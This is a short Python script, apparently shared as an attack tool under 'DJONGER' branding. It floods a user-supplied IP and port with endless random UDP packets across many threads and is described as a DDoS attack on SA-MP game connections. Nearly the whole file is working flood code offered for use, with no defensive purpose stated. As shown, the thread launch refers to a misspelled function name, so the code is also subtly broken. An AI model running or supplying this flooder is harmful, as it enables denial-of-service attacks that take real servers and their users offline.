# DJONGER - Ddos Attack script that made on purpose.
# Launches a attack to the SAMP connection client.
import random
import socket
import threading
print("""

-------------------- DJONGER TOOLS --------------------     
                                               
                                               
    DJONGER - DDoS Attacks - DJONGER
    Author : Djonger
""")

ip = str(input("> IP NYAH : "))
port = int(input("> PORT NYAH : "))
times = int(input("> Paket Perkoneksi : "))
threads = int(input("> Paket : "))

# Attack
def djonger():
	data = random._urandom(1928)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"MISI... >> Paket sedang dalam pengiriman {ip} Dan paket akan segera sampai {port}")
		except:
			print(f"MISI... >> Paket sedang dalam pengiriman {ip} Dan paket akan segera sampai {port}")

# Threads
for y in range(threads):
	th = threading.Thread(target = Djonger)
	th.start()
